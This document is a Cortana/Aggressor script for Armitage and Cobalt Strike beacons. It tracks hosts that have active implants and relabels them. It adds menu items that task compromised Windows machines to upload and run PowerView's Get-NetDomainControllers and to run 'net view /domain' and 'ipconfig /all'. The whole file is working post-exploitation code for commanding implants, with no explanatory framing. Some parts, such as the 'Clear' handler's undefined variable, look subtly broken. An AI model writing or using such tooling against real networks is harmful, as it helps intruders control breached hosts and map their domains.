import msf.*;
import java.awt.*;
import java.io.*;
import java.net.*;
import javax.swing.*;
import javax.imageio.*;
import ui.*;
import console.*;
import armitage.*;
import beacon.*;
import beacon.jobs.*;
import javax.swing.table.*;
import table.*;
import cloudstrike.*;

%beaconHosts = %();

# modify the host image for any beacon
filter host_image {

		local('$address');
		$address = $2['address'];

		# if this address has an active beacon
		if ($address in %beaconHosts){
				# check if the .png script resource is in a subdirectory (for load_all.cna)
				if (-exists script_resource("/beacon/beacon_image.png")){
						# change its host icon
						push($1, script_resource("/beacon/beacon_image.png"));
				}
				else{
						# otherwise assume the resource is in the script location
						push($1, script_resource("beacon_image.png"));
				}
		}
		return @_;
}

# check the database for beacons every 5 seconds
# TODO: refresh the beaconHosts list with the active beacon list
on heartbeat_5s {

		# get all the active beacons from the database
		@beacons = call('beacon.list');

		# reset the internal beacon list
		%beaconHosts = %();

		# rebuild the internal beacon list
		foreach %beacon (@beacons) {
				# %beacon => ($id, $computer, $host, $last, $external, $pid, $user, $internal)

				# get the internal IP for the beacon
				$internal = %beacon["internal"];

				if ($internal ne ""){
						%beaconHosts[$internal] = %beacon["id"];
				}

				# if this beacon host isn't currently in the database, add it
				# so it'll appear in the workspace
				@hosts = host_addresses();
				if ($internal !in @hosts){
						host_add($internal);
				}

				$data = host_data($internal);

				if ($data ne $null){
						$currentLabel = host_data($internal)['label'];
						%label[$internal] = $currentLabel;

						# if this host isn't marked as a beacon, mark it
						if ("beacon *" !iswm $currentLabel){
								%label[$internal] = "beacon $currentLabel";
						}

						# push the new/existing label
						call_async("db.report_labels", %label);
				}
		}

		# grab all active session addresses
		$addresses = host_addresses();

		# iterate through all of our active addresses
		foreach $address ($addresses){

				# grab the host's label
				$currentLabel = host_data($address)['label'];

				# if the host is not in our active beacon list
				if ($address !in %beaconHosts){
						# if the label is "beacon ", reset the label to the original value
						if ( "beacon *" iswm $currentLabel){
								# cut out the "beacon " section
								%label[$address] = substr($currentLabel,7);
								# push the new label
								call_async("db.report_labels", %label);
						}
				}

		}
}

# task beacon to do our bidding...
sub taskit {
	call_async($mclient, "beacon.task", $1, $2, lhost());
	call_async($mclient, "beacon.task", $1, $3, lhost());
								call_async($mclient, "beacon.log_write", $1, "[*] $4 $+ \n");
						}

sub _extractFunctions {
	local('$line @r');
	foreach $line (split("\n", $1)) {
		$line = ["$line" trim];
		if ($line ismatch '\s*function ([a-zA-Z0-9-]*).*?') {
			push(@r, matched()[0]);
		}
	}

	return @r;
}

sub task_powershell_import {
		# task ID ($1) with powershell command + args ($2)
		local('$id $len');

		$id = $1;
		$data = $2;
		$len = strlen($data);

		# task beacon to import the PowerShell script
		call_async("beacon.task", $id, pack("IIZ $+ $len", 0x25, $len, $data), lhost());
		call_async("beacon.log_write", $id, "[*] Tasked beacon to import PowerShell\n");
}

# task our beacon to execute a given powershell command
sub task_powershell {

		$id = $1;
		$len  = strlen($2);

		call_async("beacon.task", $id, pack("IIZ $+ $len", 0x24, $len, $2), lhost());
		call_async("beacon.log_write", $id, "[*] Tasked beacon to run: $2 $+ \n");
}


sub task_get_dom {
	 $beacon_id = $1;
	 $script_source = script_resource("powerview.ps1");

	 # get all of our data that we're going to upload
	 $handle = openf($script_source);
	 $data = readb($handle, -1);
	 closef($handle);

	 # task the beacon to import the powershell data
	 task_powershell_import($beacon_id, $data);

	 # actually task the beacon
	 task_powershell($beacon_id, "Get-NetDomainControllers -Verbose");
###
}

popup beacon_top {
		item "Get Domain" {
			local('$bid');
			foreach $bid ($1) {
				task_get_dom($bid);
			}
		}

		 item "Get Domain (cmd)" {
			 local('$bid');
			 foreach $bid ($1) {
					bshell($bid, "net view /domain");
			}
		}

		item "ipconfig" {
			local('$bid');
			foreach $bid ($1) {
				bshell($bid, "ipconfig /all");
			}
	 	}

		item "Clear" {
			if ($address in %beaconHosts) {
				$beaconID = %beaconHosts[$address];

				# remove the beacon from the database
				call('beacon.remove', $beaconID);

				# clear out the label
				$currentLabel = host_data($address)['label'];
				%label[$address] = $currentLabel;

				if ( "beacon *" iswm $currentLabel){
					%label[$address] = substr($currentLabel,7);
				}

				# push the old label back in
				call_async("db.report_labels", %label);

				# finally, remove this from our beacon internal list
				removeAt(%beaconHosts, $address);
		}
	}
}